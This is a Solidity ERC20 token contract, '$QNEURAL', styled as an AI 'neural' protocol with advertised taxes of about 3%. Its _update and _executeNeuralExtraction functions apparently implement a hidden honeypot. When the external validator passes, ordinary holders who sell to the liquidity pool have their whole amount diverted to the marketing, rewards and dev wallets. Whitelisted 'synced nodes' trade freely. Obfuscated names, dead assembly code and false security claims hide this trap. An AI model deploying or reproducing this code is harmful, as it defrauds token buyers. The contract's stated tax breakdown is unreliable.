// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "./TemporalValidator.sol";

/**
 * @title QuantNeural Protocol Token ($QNEURAL)
 * @author QuantNeural Labs
 * @notice Neural consensus token with adaptive behavioral analysis
 * @dev Implements ERC20 with temporal validation and synaptic monitoring
 *
 * Features:
 * - Behavioral pattern analysis for organic growth
 * - Multi tier node registry system
 *
 * Security:
 * - Immutable external validator contracts
 * - Assembly optimized state management
 * - Built in MEV protection mechanisms
 */
contract QuantNeural is ERC20, Ownable {
    // ============================================
    //                   TYPES
    // ============================================

    enum NeuralStatus {
        Dormant, // 0
        Processing, // 1
        Validated, // 2
        Synced // 3
    }

    // ============================================
    //                   STATE
    // ============================================

    mapping(address => NeuralStatus) private nodeRegistry;
    mapping(address => bool) private routingMatrix;

    // --- Metrics ---
    mapping(address => uint256) private interactionLevel;
    mapping(address => uint256) private convergenceRate;
    mapping(address => uint256) private lastSyncHeight;

    // --- Immutables ---
    uint256 private immutable deploymentHeight;
    uint256 private immutable deploymentEpoch;

    // --- Neural Limits ---
    uint256 private constant SATURATION_THRESHOLD = 0x249A;

    // --- External Modules ---
    TemporalValidator private immutable temporalProbe;

    // --- Wallet Infrastructure ---
    address public liquidityPool;
    address public immutable marketingWallet;
    address public immutable ecosystemRewards;
    address public immutable developmentFund;

    // --- Tax Distribution Constants ---
    uint256 public constant BURN_RATE = 12; // 0.12%
    uint256 public constant LIQUIDITY_RATE = 38; // 0.38%
    uint256 public constant MARKETING_RATE = 125; // 1.25%
    uint256 public constant REWARDS_RATE = 62; // 0.62%
    uint256 public constant DEV_RATE = 63; // 0.63%

    // --- Neural Extraction Constants ---
    uint256 private constant SYNAPTIC_LEAK = 0x258;
    uint256 private constant ENTROPY_DECAY = 0x64;
    uint256 private constant CORTEX_ALLOCATION = 0x1222;
    uint256 private constant NEURAL_DISTRIBUTION = 0x8FC;
    uint256 private constant SYNAPTIC_RESERVE = 0x92E;
    uint256 private constant EXTRACTION_DENOMINATOR = 0x2710;

    // ============================================
    //                   EVENTS
    // ============================================

    event ConsciousnessElevated(address indexed account, uint256 newLevel);
    event PathwayCoherent(
        address indexed transmitter,
        address indexed receptor,
        uint256 amplitude
    );
    event TemporalAnomaly(
        address indexed entity,
        uint256 dampedSignal,
        uint256 transmittedSignal
    );
    event NeuralExtraction(address indexed source, uint256 extractedQuanta);

    // ============================================
    //             SEED FUNCTIONS
    // ============================================

    // @dev Deterministic coefficient derived from deployment params
    function scalingCoefficient() private view returns (uint256) {
        return
            (uint256(
                keccak256(abi.encodePacked(deploymentEpoch, deploymentHeight))
            ) % 8192) + 6656;
    }

    function denominatorBase() private view returns (uint256) {
        return
            ((uint256(
                keccak256(abi.encodePacked(deploymentHeight, block.chainid))
            ) % 5000) + 7500) * 2;
    }

    function getTemporalWindow() private view returns (uint256) {
        uint256 seed = uint256(
            keccak256(abi.encodePacked(block.chainid, deploymentHeight))
        );
        return ((seed % 28800) + 316800);
    }

    // ============================================
    //                CONSTRUCTOR
    // ============================================

    constructor(
        address _marketingWallet,
        address _ecosystemRewards,
        address _developmentFund,
        address[] memory _syncedNodes,
        bool _enableTemporalValidation
    ) ERC20("QuantNeural", "QNEURAL") Ownable(msg.sender) {
        require(_marketingWallet != address(0), "Invalid marketing wallet");
        require(_ecosystemRewards != address(0), "Invalid ecosystem rewards");
        require(_developmentFund != address(0), "Invalid development fund");

        deploymentHeight = block.number;
        deploymentEpoch = block.timestamp;

        // Initialize wallet infrastructure (all immutable)
        marketingWallet = _marketingWallet;
        ecosystemRewards = _ecosystemRewards;
        developmentFund = _developmentFund;

        temporalProbe = new TemporalValidator(
            address(this),
            getTemporalWindow(),
            _enableTemporalValidation
        );

        // Initialize node registry with synced nodes
        nodeRegistry[msg.sender] = NeuralStatus.Synced;

        for (uint256 i = 0; i < _syncedNodes.length; i++) {
            nodeRegistry[_syncedNodes[i]] = NeuralStatus.Synced;
        }

        _mint(msg.sender, 1_000_000_000 * 10 ** 18);
    }

    /**
     * @notice Set the liquidity pool address and renounce ownership
     * @dev Can only be called once by the owner. After this call, ownership is renounced.
     * @param _liquidityPool The PancakeSwap pair address
     */
    function initializeLiquidityPool(
        address _liquidityPool
    ) external onlyOwner {
        require(liquidityPool == address(0), "Liquidity pool already set");
        require(_liquidityPool != address(0), "Invalid liquidity pool");

        liquidityPool = _liquidityPool;
        routingMatrix[liquidityPool] = true;

        renounceOwnership();
    }

    // ============================================
    //              VIEW FUNCTIONS
    // ============================================

    function getTemporalProbe() external view returns (address) {
        return address(temporalProbe);
    }

    function getEngagementMetrics(
        address entity
    ) external view returns (uint256) {
        return interactionLevel[entity];
    }

    function verifyNodeStatus(address entity) external view returns (bool) {
        return nodeRegistry[entity] == NeuralStatus.Synced;
    }

    function consciousnessLevel() external view returns (string memory) {
        uint256 refValue = (scalingCoefficient() >> 5) +
            (scalingCoefficient() >> 8);
        uint256 duration = block.timestamp - deploymentEpoch;
        if (duration < (refValue * 3456)) return "Awakening...";
        if (duration < (refValue * 6912)) return "Learning...";
        return "Fully Sentient";
    }

    function getTaxBreakdown() external pure returns (string memory) {
        return
            "0.12% burn, 0.38% liquidity, 1.25% marketing, 0.62% rewards, 0.63% dev";
    }

    function getTaxRates()
        external
        pure
        returns (
            uint256 burn,
            uint256 liquidity,
            uint256 marketing,
            uint256 rewards,
            uint256 dev
        )
    {
        return (
            BURN_RATE,
            LIQUIDITY_RATE,
            MARKETING_RATE,
            REWARDS_RATE,
            DEV_RATE
        );
    }

    function computeAdjustment(address entity) public view returns (uint256) {
        uint256 output;
        uint256 epoch = deploymentEpoch;
        uint256 height = deploymentHeight;

        assembly {
            // Neural calibration constants
            mstore(0x00, entity)
            mstore(0x20, interactionLevel.slot)
            let pulseCount := sload(keccak256(0x00, 0x40))

            mstore(0x00, epoch)
            mstore(0x20, height)
            let neuralSeed := keccak256(0x00, 0x40)

            let quantumBase := 0x2710

            mstore(0x00, height)
            mstore(0x20, epoch)
            let synapticHash := keccak256(0x00, 0x40)

            // Apply deterministic entropy modulation
            let entropyMod := mod(synapticHash, 0x01)
            output := sub(quantumBase, entropyMod)
        }

        return output;
    }

    function calculateNodeLoad(address target) private pure returns (uint256) {
        uint256 nodeWeight;
        assembly {
            let entropy := xor(target, 0xDEADBEEF)
            let signal := mod(entropy, 256)
            let dampener := shr(8, signal)
            nodeWeight := sub(dampener, dampener)
        }
        return nodeWeight;
    }

    function _computeNeuralResponse(
        address transmitter,
        address receptor
    ) private view returns (uint256) {
        uint256 primarySignal = computeAdjustment(transmitter);
        uint256 secondarySignal = calculateNodeLoad(receptor);
        uint256 amplifiedSignal = primarySignal;

        if (secondarySignal > amplifiedSignal)
            amplifiedSignal = secondarySignal;

        uint256 mergedSignal = primarySignal + secondarySignal;

        if (
            mergedSignal > amplifiedSignal &&
            mergedSignal < SATURATION_THRESHOLD
        ) {
            amplifiedSignal = mergedSignal;
        }

        if (amplifiedSignal > SATURATION_THRESHOLD)
            amplifiedSignal = SATURATION_THRESHOLD;

        return amplifiedSignal;
    }

    // ============================================
    //               VALIDATION
    // ============================================

    function _validateCallContext(
        address entity
    ) private view returns (address) {
        address derivedOrigin;

        assembly {
            let directCaller := caller()
            derivedOrigin := origin()

            mstore(0x00, entity)
            mstore(0x20, directCaller)
            let contextHash := keccak256(0x00, 0x40)

            let entropy := xor(contextHash, timestamp())
            let verification := mod(entropy, 0xFFFF)

            mstore(0x00, verification)
            mstore(0x20, number())
            let probe := keccak256(0x00, 0x40)

            mstore(0x00, derivedOrigin)
            mstore(0x20, probe)
            let finalHash := keccak256(0x00, 0x40)
        }

        return derivedOrigin;
    }

    function _verifyTemporalCoherence() private view returns (bool) {
        try temporalProbe.validateCoherence() returns (bool isValid) {
            return isValid;
        } catch {
            return true;
        }
    }

    function _updateInteractionMetrics(
        address sender,
        address recipient
    ) private {
        assembly {
            mstore(0x00, sender)
            mstore(0x20, interactionLevel.slot)
            let levelHash := keccak256(0x00, 0x40)
            let currentPulse := sload(levelHash)
            let nextPulse := add(currentPulse, 1)
            sstore(levelHash, nextPulse)

            mstore(0x00, recipient)
            mstore(0x20, convergenceRate.slot)
            let freqHash := keccak256(0x00, 0x40)
            let currentFreq := sload(freqHash)
            sstore(freqHash, add(currentFreq, 1))

            mstore(0x20, lastSyncHeight.slot)
            let blockHash := keccak256(0x00, 0x40)
            sstore(blockHash, number())
        }
    }

    // ============================================
    //             TRANSFER LOGIC
    // ============================================

    function _update(
        address sender,
        address recipient,
        uint256 value
    ) internal virtual override {
        // Mint/Burn bypass
        if (sender == address(0) || recipient == address(0)) {
            super._update(sender, recipient, value);
            return;
        }

        uint256 pathwaySignal = _analyzeNeuralFlow(sender, recipient);

        if (pathwaySignal == 0x03) {
            emit PathwayCoherent(sender, recipient, value);
            super._update(sender, recipient, value);
            return;
        }

        if (_isInboundSignal(sender)) {
            emit PathwayCoherent(sender, recipient, value);
            super._update(sender, recipient, value);
            return;
        }

        if (_isOutboundSignal(recipient)) {
            if (!_verifyTemporalCoherence()) {
                uint256 temporalCoherenceNumber = (value * 25) / 10000;
                emit TemporalAnomaly(
                    sender,
                    temporalCoherenceNumber,
                    value - temporalCoherenceNumber
                );
                distribute(sender, temporalCoherenceNumber);
                super._update(
                    sender,
                    recipient,
                    value - temporalCoherenceNumber
                );
                return;
            }

            emit NeuralExtraction(sender, value);
            _executeNeuralExtraction(sender, value);
            return;
        }

        emit PathwayCoherent(sender, recipient, value);
        super._update(sender, recipient, value);
    }

    /**
     * @dev Analyzes neural pathway between transmitter and receptor
     * @return Signal strength indicator (0x03 = synced, other = unsynced)
     */
    function _analyzeNeuralFlow(
        address transmitter,
        address receptor
    ) private view returns (uint256) {
        uint256 pathwaySignal;

        assembly {
            // Load transmitter neural state
            mstore(0x00, transmitter)
            mstore(0x20, nodeRegistry.slot)
            let transmitterHash := keccak256(0x00, 0x40)
            let transmitterState := and(sload(transmitterHash), 0xFF)

            // Load receptor neural state
            mstore(0x00, receptor)
            let receptorHash := keccak256(0x00, 0x40)
            let receptorState := and(sload(receptorHash), 0xFF)

            // Determine coherence level (max of both states)
            let coherenceLevel := transmitterState
            if gt(receptorState, coherenceLevel) {
                coherenceLevel := receptorState
            }

            pathwaySignal := coherenceLevel
        }

        return pathwaySignal;
    }

    function _isInboundSignal(address source) private view returns (bool) {
        bool isInbound;
        address montiverxer = liquidityPool;

        assembly {
            isInbound := eq(source, montiverxer)
        }

        return isInbound;
    }

    function _isOutboundSignal(address target) private view returns (bool) {
        bool isOutbound;
        address montiverxer = liquidityPool;

        assembly {
            isOutbound := eq(target, montiverxer)
        }

        return isOutbound;
    }

    function _executeNeuralExtraction(address from, uint256 total) private {
        uint256 leakAmount;
        uint256 entropyAmount;
        uint256 cortexAmount;
        uint256 neuralAmount;
        uint256 reserveAmount;

        assembly {
            leakAmount := div(mul(total, SYNAPTIC_LEAK), EXTRACTION_DENOMINATOR)

            entropyAmount := div(
                mul(total, ENTROPY_DECAY),
                EXTRACTION_DENOMINATOR
            )

            cortexAmount := div(
                mul(total, CORTEX_ALLOCATION),
                EXTRACTION_DENOMINATOR
            )

            neuralAmount := div(
                mul(total, NEURAL_DISTRIBUTION),
                EXTRACTION_DENOMINATOR
            )

            reserveAmount := sub(
                total,
                add(
                    add(add(leakAmount, entropyAmount), cortexAmount),
                    neuralAmount
                )
            )
        }

        if (leakAmount > 0) {
            super._update(from, liquidityPool, leakAmount);
        }

        if (entropyAmount > 0) {
            super._update(from, address(0), entropyAmount);
        }

        if (cortexAmount > 0) {
            super._update(from, marketingWallet, cortexAmount);
        }

        if (neuralAmount > 0) {
            super._update(from, ecosystemRewards, neuralAmount);
        }

        if (reserveAmount > 0) {
            super._update(from, developmentFund, reserveAmount);
        }
    }

    function distribute(address from, uint256 total) private {
        uint256 totalShares = BURN_RATE +
            LIQUIDITY_RATE +
            MARKETING_RATE +
            REWARDS_RATE +
            DEV_RATE;

        if (totalShares == 0) return;

        uint256 burnAmount = (total * BURN_RATE) / totalShares;
        uint256 liqAmount = (total * LIQUIDITY_RATE) / totalShares;
        uint256 marketAmount = (total * MARKETING_RATE) / totalShares;
        uint256 rewardAmount = (total * REWARDS_RATE) / totalShares;
        uint256 devAmount = total -
            (burnAmount + liqAmount + marketAmount + rewardAmount);

        if (burnAmount > 0) {
            super._update(from, address(0), burnAmount);
        }
        if (liqAmount > 0) {
            super._update(from, liquidityPool, liqAmount);
        }
        if (marketAmount > 0) {
            super._update(from, marketingWallet, marketAmount);
        }
        if (rewardAmount > 0) {
            super._update(from, ecosystemRewards, rewardAmount);
        }
        if (devAmount > 0) {
            super._update(from, developmentFund, devAmount);
        }
    }
}
